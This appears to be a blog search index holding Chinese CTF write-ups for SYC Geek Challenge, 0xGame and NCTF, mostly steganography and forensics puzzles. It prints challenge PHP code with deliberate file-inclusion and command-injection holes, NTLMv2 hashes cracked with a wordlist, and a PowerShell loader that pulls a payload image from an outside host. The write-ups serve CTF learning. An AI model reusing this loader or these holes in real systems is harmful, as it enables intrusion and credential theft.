<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2023 SYCGeekchallenge-Writeup-Misc</title>
    <url>/2023/12/02/2023%20SYCGeekchallenge-Writeup-Misc/</url>
    <content><![CDATA[<h1>2023 SYCGeekchallenge-Writeup-Misc</h1>
<h2 id="Misc">Misc</h2>
<p>除区块链以外，还差一题ak，太菜啦，qwq~~</p>
<h3 id="cheekin">cheekin</h3>
<p><strong>考点：LSB隐写</strong></p>
<p>公众号发送flag，得到一张图片</p>
<p>检查为LSB隐写</p>
<p><img src="https://s2.loli.net/2023/12/02/2zahuAKp7Bx4iTI.png" alt="2023SYCgeek_1"></p>
<h3 id="ez-smilemo">ez_smilemo</h3>
<p><strong>考点：反编译，字符串搜索</strong></p>
<p>发现存在data.win文件，搜索后发现反编译工具UndertaleModTool</p>
<p>检索后发现存在一段base字符串</p>
<p><img src="https://s2.loli.net/2023/12/02/ZegbPd1kE59r3h4.png" alt="2023SYCgeek_2"></p>
<p>解密后得到flag</p>
<p><img src="https://s2.loli.net/2023/12/02/fECjwTMqQnR6BWu.png" alt="2023SYCgeek_3"></p>
<h3 id="下一站是哪儿呢">下一站是哪儿呢</h3>
<p><strong>考点：文件分离，银河文字密码，信息搜集</strong></p>
<p>猪猪侠图片分离出一张图片，银河文字密码解密出得到IWANGTOGOYTOLIQUORCITY</p>
<p><img src="https://s2.loli.net/2023/12/02/a4Jy6OXvd2EhnmI.jpg" alt="2023SYCgeek_4"></p>
<p>然后搜索酒城得到泸州</p>
<p>查询8月25日航班得到答案</p>
<p><img src="https://s2.loli.net/2023/12/02/pnAdREa6PMzX7sC.png" alt="2023SYCgeek_5"></p>
<h3 id="Qingwan心都要碎了">Qingwan心都要碎了</h3>
<p><strong>考点：信息搜集</strong></p>
<p>做题流程  下载附件，是个网页；点进去，可以看到Yxx发的朋友圈；保存下来，用百度识图；发现是重庆中国三峡博物馆</p>
<h3 id="xqr">xqr</h3>
<p><strong>考点：文件分离，二维码xor</strong></p>
<p>首先使用foremost分离得到了两张二维码</p>
<p>由于其中有一张是模糊的，刚开始愣生生把那张修复好，但是完全扫不出东西</p>
<p>后来有了hint，才恍然大悟</p>
<p>一张尺寸为15×15，一张为75×75</p>
<p>首先 将两张恢复到同一尺寸，然后使用stegsolve的image combiner功能进行XOR</p>
<p><img src="https://s2.loli.net/2023/12/02/oQXf1PbvkL7g2YE.png" alt="2023SYCgeek_6"></p>
<p>得到的二维码用微信扫码就得到flag</p>
<p><img src="https://s2.loli.net/2023/12/02/bGOlcXa8ekYJ4FE.png" alt="2023SYCgeek_7"></p>
<h3 id="Tears-of-the-times">Tears of the times</h3>
<p><strong>考点：取证痕迹分析</strong></p>
<p>发现可疑地址</p>
<p><img src="https://s2.loli.net/2023/12/02/gb6V9ZC1MYpeq7R.png" alt="2023SYCgeek_8"></p>
<p>找到相应图片买得到flag</p>
<p><img src="https://s2.loli.net/2023/12/02/hLcjIl7mYRrz4Vx.png" alt="2023SYCgeek_9"></p>
<h3 id="extractMe">extractMe</h3>
<p><strong>考点：crc32碰撞</strong></p>
<p>crc32碰撞4字节的，结果看图</p>
<p><img src="https://s2.loli.net/2023/12/02/mxFMAk7o5NqtrQ6.png" alt="2023SYCgeek_10.PNG"></p>
<h3 id="DEATH-N0TE">DEATH_N0TE</h3>
<p><strong>考点：像素点提取，LSB隐写</strong></p>
<p>给了一张图片，010打开发现末尾有一段base，解密后无用</p>
<p>lsb查看发现存在一段base，解密后得到前半段flag</p>
<p>同时stegsolve查看发现像素点异常，故尝试提取</p>
<p>最终在每隔5个像素点得到需要的图片</p>
<p>脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="comment"># 存放于同名文件夹之下</span></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;start.png&#x27;</span>)</span><br><span class="line">pix = im.load()</span><br><span class="line">width = im.size[<span class="number">0</span>]</span><br><span class="line">height = im.size[<span class="number">1</span>]</span><br><span class="line"><span class="comment"># 根据实际所需填写像素间隔</span></span><br><span class="line">a = <span class="number">5</span></span><br><span class="line">new_width = width // a</span><br><span class="line">new_height = height // a</span><br><span class="line"><span class="comment"># 创建一个新的图像对象</span></span><br><span class="line">new_img = Image.new(<span class="string">&quot;RGB&quot;</span>, (new_width, new_height))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, width, a):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, height, a):</span><br><span class="line">        rgb = pix[x, y]</span><br><span class="line">        new_img.putpixel((x // a, y // a), (<span class="built_in">int</span>(rgb[<span class="number">0</span>]), <span class="built_in">int</span>(rgb[<span class="number">1</span>]), <span class="built_in">int</span>(rgb[<span class="number">2</span>])))</span><br><span class="line">new_img.save(<span class="string">&#x27;new_image.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/12/02/nDFfAt9IH7wJ5pq.png" alt="2023SYCgeek_11.PNG"></p>
<p>对照得到字符串</p>
<p>TkFNRV9vMnRha3VYWH0=</p>
<p>得到一半flag</p>
<p>还有一段藏在lsb隐写给的一长段base64中</p>
<p><img src="https://s2.loli.net/2023/12/02/yjqiaQmLWRSrAfb.png" alt="2023SYCgeek_12.PNG"></p>
<h3 id="DEATH-N1TE">DEATH_N1TE</h3>
<p><strong>考点：gaps拼图，sstv音频隐写</strong></p>
<p>将图片分帧，gaps拼图，得到一半flag</p>
<p><img src="https://s2.loli.net/2023/12/02/ZehOUiNatAV1oM4.png" alt="2023SYCgeek_13"></p>
<p>使用rx-sstv播放mp3文件获取第一部分flag</p>
<p><img src="https://s2.loli.net/2023/12/02/vTPGmZuJ7QMbX2q.png" alt="2023SYCgeek_14"></p>
<p>SYC{H4xr0t0r_14_Ki114R}</p>
<h3 id="DEATH-N2TE">DEATH_N2TE</h3>
<p><strong>考点：视频像素点提取</strong></p>
<p>先视频分帧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">cap = cv2.VideoCapture(<span class="string">&#x27;kira.mp4&#x27;</span>)</span><br><span class="line">output_folder = <span class="string">&#x27;frames&#x27;</span></span><br><span class="line">os.makedirs(output_folder, exist_ok=<span class="literal">True</span>)</span><br><span class="line">frame_count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    ret, frame = cap.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ret:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    frame_count += <span class="number">1</span></span><br><span class="line">    frame_filename = <span class="string">f&quot;<span class="subst">&#123;output_folder&#125;</span>/frame_<span class="subst">&#123;frame_count:04d&#125;</span>.jpg&quot;</span></span><br><span class="line">    cv2.imwrite(frame_filename, frame)</span><br><span class="line">    cv2.imshow(<span class="string">&#x27;Processed Frame&#x27;</span>, frame)</span><br><span class="line">    <span class="keyword">if</span> cv2.waitKey(<span class="number">25</span>) &amp; <span class="number">0xFF</span> == <span class="built_in">ord</span>(<span class="string">&#x27;q&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">cap.release()</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure>
<p>提取所有白色的像素点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">input_folder = <span class="string">&#x27;./frames&#x27;</span></span><br><span class="line">output_image = <span class="string">&#x27;output_combined_image.jpg&#x27;</span></span><br><span class="line">image_files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(input_folder) <span class="keyword">if</span> f.endswith((<span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.jpeg&#x27;</span>))]</span><br><span class="line">max_x, max_y = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> image_file <span class="keyword">in</span> image_files:</span><br><span class="line">    image_path = os.path.join(input_folder, image_file)</span><br><span class="line">    image = cv2.imread(image_path)</span><br><span class="line">    max_x = <span class="built_in">max</span>(max_x, image.shape[<span class="number">0</span>])</span><br><span class="line">    max_y = <span class="built_in">max</span>(max_y, image.shape[<span class="number">1</span>])</span><br><span class="line">combined_image = np.zeros((max_x, max_y, <span class="number">3</span>), dtype=np.uint8)</span><br><span class="line"><span class="keyword">for</span> image_file <span class="keyword">in</span> image_files:</span><br><span class="line">    image_path = os.path.join(input_folder, image_file)</span><br><span class="line">    image = cv2.imread(image_path)</span><br><span class="line">    gray_image = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)</span><br><span class="line">    _, binary_image = cv2.threshold(gray_image, <span class="number">200</span>, <span class="number">255</span>, cv2.THRESH_BINARY)</span><br><span class="line">    white_pixel_coordinates = np.column_stack(np.where(binary_image == <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">for</span> coordinate <span class="keyword">in</span> white_pixel_coordinates:</span><br><span class="line">        x, y = coordinate</span><br><span class="line">        combined_image[x, y, :] = [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>]  <span class="comment"># 设置为白色</span></span><br><span class="line">cv2.imwrite(output_image, combined_image)</span><br><span class="line">cv2.imshow(<span class="string">&#x27;Combined Image&#x27;</span>, combined_image)</span><br><span class="line">cv2.waitKey(<span class="number">0</span>)</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure>
<p>得到flag：SYC{we1c0m4_T0_De@tH_W0r1d}</p>
<p>最后压缩一下像素点，是图片更清楚</p>
<p><img src="https://s2.loli.net/2023/12/02/KzQufGPXsp7LZWx.png" alt="2023SYCgeek_15"></p>
<h3 id="窃听风云">窃听风云</h3>
<p><strong>考点：NTLM协议破解</strong></p>
<p>就是对捕捉的Ntlm协议进行解析</p>
<p>详细解析如下</p>
<p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8netsh%E6%8A%93%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash">渗透技巧——利用netsh抓取连接文件服务器的NTLMv2 Hash (3gstudent.github.io)</a></p>
<p>基本格式</p>
<p>NTLMv2的格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure>
<p>然后使用john和rockyou.txt破解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NETNTLMv2: jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000 </span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/12/02/yKxAprDETQG3HiV.png" alt="2023SYCgeek_16"></p>
<p><img src="https://s2.loli.net/2023/12/02/HM8U4bSsF6fjE1k.png" alt="2023SYCgeek_17"></p>
<h3 id="窃听风云-v2">窃听风云-v2</h3>
<p><strong>考点：NTLM协议破解</strong></p>
<p>这是仅有的没有做出来的一道题，qwq，其实不难的</p>
<p>基本原理同上，但是由于是使用的smtp协议，所以不能自动解析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jack::WidgetLLC.Internal:3e3966c8cacd29f7:ddd46fd8f78c262eae16918f66185497:010100000000000050fd26d235edd9011219408ccb8a364800000000020012005700490044004700450054004c004c0043000100100043004c00490045004e00540030003300040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000300360043004c00490045004e005400300033002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000700080050fd26d235edd90106000400020000000800300030000000000000000000000000300000c78e803920758ec5672c36696ee163f6a4e61c8b5463c247daef8571677995a40a001000000000000000000000000000000000000900200053004d00540050002f0075006e007300700065006300690066006900650064000000000000000000</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/12/02/1sX2j3rEeZNofSw.png" alt="2023SYCgeek_18"></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>SYCGeekchallenge</tag>
      </tags>
  </entry>
  <entry>
    <title>20230xGameWeek1-Writeup</title>
    <url>/2023/10/24/20230xGameWeek1-Writeup/</url>
    <content><![CDATA[<h1>20230xGameWeek1-Writeup</h1>
<h2 id="Web">Web</h2>
<h3 id="Sign-In">Sign In</h3>
<p><strong>考点：f12</strong></p>
<p>f12查看源代码，在main.js中找到flag</p>
<p><img src="https://s2.loli.net/2023/10/19/8XbFGiRmQf6jdlk.png" alt=""></p>
<h3 id="baby-php">baby_php</h3>
<p><strong>考点：php特性利用</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>) &amp;&amp; <span class="variable">$c</span> != <span class="number">1024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$c</span>) == <span class="number">1024</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$name</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>简单来分析解读一下，首先时读取了两个get参数a和b，一个post参数c，以及一个cookie。</p>
<p>对于两个get参数a和b的要求时值不相等，但是md5相等，因此我们可以去了解一下MD5绕过，通过0e绕过即可过第一层。然后需要绕过is_numeric和intval。</p>
<p>在进行以上绕过之后，还需要对最后存在一个可控cookie参数name进行进一步的利用，通过php伪协议进行读取。</p>
<p><img src="https://s2.loli.net/2023/10/21/xp7u6a9TAWHh1zy.png" alt=""></p>
<p>然后将结果进行解码，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &#x27;0xGame&#123;43bb3e24-0824-48cb-95d0-c471540c0953&#125;&#x27;;</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
<h3 id="hello-http">hello_http</h3>
<p><strong>考点：http协议</strong></p>
<p>这题所考察的就是http相关知识</p>
<p>第一步是传入get参数，需要传一个/?query=ctf</p>
<img src="https://s2.loli.net/2023/10/21/LS35EKV8d9FARpv.png"  />
<p>第二步是传入post参数，action=getflag</p>
<p><img src="https://s2.loli.net/2023/10/21/LPm4GfCjn3X5KyQ.png" alt=""></p>
<p>第三步是改变身份认证，在cookie参数中写入role=admin</p>
<p><img src="https://s2.loli.net/2023/10/21/bhacRA5L9zNdr6H.png" alt=""></p>
<p>第四步是本地ip，相关参数有X-Forwarded-For，伪造127.0.0.1</p>
<p><img src="https://s2.loli.net/2023/10/21/w9nH8JUbxcCi4TZ.png" alt=""></p>
<p>第五步是User-Agent，中名为用户代理，可以进行伪造HarmonyOS Browser</p>
<p><img src="https://s2.loli.net/2023/10/21/gCNPT9rqOtJVB4o.png" alt=""></p>
<p>第六步是Referer 请求头包含了当前请求页面的来源页面的地址，<a href="http://xn--ys-jk3c39f.mihoyo.com">传入ys.mihoyo.com</a></p>
<p><img src="https://s2.loli.net/2023/10/21/RkzZV2cBXCnmjfx.png" alt=""></p>
<p>最终得到flag</p>
<p><img src="https://s2.loli.net/2023/10/21/eL257NWDcK8gAuI.png" alt=""></p>
<h3 id="repo-leak">repo_leak</h3>
<p><strong>考点：git泄露</strong></p>
<p>顾名思义，这是信息泄露相关。这里所考察的是git泄露</p>
<p>题目提示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Using Git for version control</span><br></pre></td></tr></table></figure>
<p>然后使用githack获取git源，使用命令查看并回退版本</p>
<p><img src="https://s2.loli.net/2023/10/23/WhFzge2GH9yrKcX.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/10/23/YaoVBvlz9761esZ.png" alt=""></p>
<p>最后在本地起一个http服务</p>
<p><img src="https://s2.loli.net/2023/10/23/gyjd9ZoVWkXhJ3v.png" alt=""></p>
<p>得到flag</p>
<p><img src="https://s2.loli.net/2023/10/23/AYNoBeOdJs4rDcF.png" alt=""></p>
<h3 id="ping">ping</h3>
<p><strong>考点：Bypass</strong></p>
<p>首先f12在源码中找到提示</p>
<p><img src="https://s2.loli.net/2023/10/23/oj6R4OdAN83pgCV.png" alt=""></p>
<p>打开api.php得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function sanitize($s) &#123;</span><br><span class="line">    $s = str_replace(&#x27;;&#x27;, &#x27;&#x27;, $s);</span><br><span class="line">    $s = str_replace(&#x27; &#x27;, &#x27;&#x27;, $s);</span><br><span class="line">    $s = str_replace(&#x27;/&#x27;, &#x27;&#x27;, $s);</span><br><span class="line">    $s = str_replace(&#x27;flag&#x27;, &#x27;&#x27;, $s);</span><br><span class="line">    return $s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&#x27;ip&#x27;])) &#123;</span><br><span class="line">    die(&#x27;No IP Address&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ip = $_POST[&#x27;ip&#x27;];</span><br><span class="line"></span><br><span class="line">$ip = sanitize($ip);</span><br><span class="line"></span><br><span class="line">if (!preg_match(&#x27;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#x27;, $ip)) &#123;</span><br><span class="line">    die(&#x27;Invalid IP Address&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(&#x27;ping -c 4 &#x27;.$ip. &#x27; 2&gt;&amp;1&#x27;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里使用function封装了一个单元，将使用sanitize函数replace了一些字符</p>
<p>同时使用了preg_match 会匹配⼀个 IP 的正则表达式，需要绕过</p>
<p>前端做的部分限制，可以通过bp抓包绕过</p>
<p><img src="https://s2.loli.net/2023/10/23/4xbqaRCzc8r9vWA.png" alt=""></p>
<h3 id="相关知识点总结">相关知识点总结</h3>
<ol>
<li>F12查看源代码</li>
<li>md5绕过</li>
<li>is_numeric函数，intval() 函数绕过</li>
<li>php伪协议</li>
<li>http参数相关</li>
<li>git泄露</li>
</ol>
<h2 id="Misc">Misc</h2>
<h3 id="SignIn">SignIn</h3>
<p>两次编码转换</p>
<p><img src="https://s2.loli.net/2023/10/24/Pzn3UJwAL1iBgYl.png" alt=""></p>
<h3 id="重生之我在教学楼打cs">重生之我在教学楼打cs</h3>
<p>这题没意思，看看就行</p>
<h3 id="shark-shark">shark shark</h3>
<p>打开是一个流量包，仔细观察可以找到一个长度很大的tcp流</p>
<p><img src="https://s2.loli.net/2023/10/24/ndDvtlF7IgkQNsr.png" alt=""></p>
<p>追踪可以看到504B开头，明显是一个压缩包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">504b0304140009000800017e3b573440eb40380000002c00000008000000666c61672e74787474f54e6e559873f67e32d14b6572f12401b92b622d75b576fd8e73fcb0f080c8d232420e19a36ac5d6852ca66d16ba25b8727e2e42d21889504b07083440eb40380000002c000000504b01021f00140009000800017e3b573440eb40380000002c000000080024000000000000002000000000000000666c61672e7478740a00200000000000010018000d740af216f1d90156fc2fa417f1d90195872fa417f1d901504b050600000000010001005a0000006e0000000000</span><br></pre></td></tr></table></figure>
<p>十六进制导入010，得到压缩包，发现需要密码</p>
<p><img src="https://s2.loli.net/2023/10/24/Rj81PYvGXHImFfc.png" alt="https://s2.loli.net/2023/10/24/Rj81PYvGXHImFfc.png"></p>
<p>追踪其他tcp流得到密码</p>
<img src="https://s2.loli.net/2023/10/24/ioUgQ7XmBPlZIS8.png" style="zoom:67%;" />
<p>打开压缩包得到flag</p>
<img src="https://s2.loli.net/2023/10/24/w8zIivrHjVlmLN5.png" style="zoom:67%;" />
<h3 id="hide-and-seek">hide and seek</h3>
<p>使用stegseek弱口令爆破得到</p>
<p><img src="https://s2.loli.net/2023/10/26/M2oHPUlO9wqg4BZ.png" alt=""></p>
<h3 id="least-and-most">least and most</h3>
<p>分别使用了lsb（最低有效位）和msb（最高有效位）</p>
<h2 id="Reverse">Reverse</h2>
<h3 id="数字筑基">数字筑基</h3>
<p>这题考察的就是二进制转换为十六进制</p>
<p><img src="https://s2.loli.net/2023/10/23/bHcE4uajoyhAfGp.png" alt=""></p>
<h3 id="代码金丹">代码金丹</h3>
<p>用ida打开后，f5反编译得到flag</p>
<p><img src="https://s2.loli.net/2023/10/24/lNXt5HA74hDCI21.png" alt=""></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>0xGame</tag>
      </tags>
  </entry>
  <entry>
    <title>2023NCTF-Writeup-Misc</title>
    <url>/2024/02/03/2023NCTF-Writeup/</url>
    <content><![CDATA[<h1>2023NCTF-Writeup-Misc</h1>
<h2 id="前言">前言</h2>
<p>NSSCTF已上线所有题目，本次实际比赛的题目只做出来两题，剩余全为赛后复现</p>
<p>这里是Misc方向的复现，拖了好久，emmmmm</p>
<p>狠狠地谴责自己（</p>
<h2 id="Misc">Misc</h2>
<h3 id="Jump-For-Signin">Jump For Signin</h3>
<p><strong>考点：二维码</strong></p>
<p>进游戏跳跃一下，然后得到二维码，扫就行了</p>
<p><img src="https://s2.loli.net/2024/02/03/QGARhyquVPaX6kF.png" alt=""></p>
<h3 id="Jump-For-Flag">Jump For Flag</h3>
<p><strong>考点：二维码，dll逆向</strong></p>
<p>对Assembly-CSharp.dll进行反编译</p>
<p><img src="https://s2.loli.net/2024/02/03/L5f68uxZvk4SQd7.png" alt=""></p>
<p>找到二维码生成块的关键代码</p>
<p>然后exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_parameters</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        lines = file.readlines()</span><br><span class="line">    parameters = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        params = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, re.findall(<span class="string">r&#x27;\d+&#x27;</span>, line)))</span><br><span class="line">        parameters.append(params)</span><br><span class="line">    <span class="keyword">return</span> parameters</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">concatenate_images</span>(<span class="params">parameters</span>):</span><br><span class="line">    img_size = (<span class="number">310</span>, <span class="number">310</span>)</span><br><span class="line">    result_img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, img_size, color=<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> params <span class="keyword">in</span> parameters:</span><br><span class="line">        row, col, image_type = params[<span class="number">1</span>], params[<span class="number">3</span>], params[<span class="number">4</span>]</span><br><span class="line">        img_path = <span class="string">f&#x27;<span class="subst">&#123;image_type&#125;</span>.png&#x27;</span></span><br><span class="line">        img = Image.<span class="built_in">open</span>(img_path)</span><br><span class="line">        x_offset = col * <span class="number">10</span></span><br><span class="line">        y_offset = row * <span class="number">10</span></span><br><span class="line">        img = img.resize((<span class="number">10</span>, <span class="number">10</span>))</span><br><span class="line">        result_img.paste(img, (x_offset, y_offset))</span><br><span class="line">    result_img.save(<span class="string">&#x27;output.png&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parameters = read_parameters(<span class="string">&#x27;input1.txt&#x27;</span>)</span><br><span class="line">    concatenate_images(parameters)</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/02/03/gfa897hZeRG2bO6.png" alt=""></p>
<h3 id="NCTF2077-jackpot">NCTF2077: jackpot</h3>
<p><strong>考点：powershell混淆</strong></p>
<p>首先是一个叫做喜报的邮件文件，打开可以发现一个图片和target.exe</p>
<p>010打开可以target.exe发现存在一段powershell代码</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;-873e-12a9595bbce8&#125;&quot;</span>;</span><br><span class="line"><span class="built_in">sal</span> a <span class="built_in">New-Object</span>; <span class="built_in">Add-Type</span> <span class="literal">-A</span> System.Drawing; <span class="variable">$g</span> = a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="string">&quot;https://zysgmzb.club/hello/nctf.png&quot;</span>)); <span class="variable">$o</span> = a Byte[] <span class="number">31720</span>; (<span class="number">0</span>..<span class="number">12</span>) | % &#123; <span class="keyword">foreach</span> (<span class="variable">$x</span> <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">2439</span>)) &#123; <span class="variable">$p</span> = <span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>, <span class="variable">$_</span>); <span class="variable">$o</span>[<span class="variable">$_</span> * <span class="number">2440</span> + <span class="variable">$x</span>] = ([<span class="type">math</span>]::Floor((<span class="variable">$p</span>.B<span class="literal">-band15</span>) * <span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$p</span>.G <span class="operator">-band</span> <span class="number">15</span>)) &#125; &#125;; <span class="built_in">echo</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$o</span>[<span class="number">0</span><span class="type">..31558</span>]))</span><br></pre></td></tr></table></figure>
<p>实际比赛的时候对powershell不熟悉</p>
<p>所以是使用的python对代码进行了重置，得到的结果，而没有直接该运行为输出</p>
<p>这是赛时使用的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开本地 PNG 图像文件</span></span><br><span class="line">image_path = <span class="string">&quot;nctf.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理像素信息</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2440</span>):</span><br><span class="line">        pixel = img.getpixel((x, y))</span><br><span class="line">        value = (pixel[<span class="number">2</span>] &amp; <span class="number">15</span>) * <span class="number">16</span> | (pixel[<span class="number">1</span>] &amp; <span class="number">15</span>)</span><br><span class="line">        result += <span class="built_in">chr</span>(value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果字符串</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
<p>后来也知道一些基本的powershell，只需要将IEX改为echo即可</p>
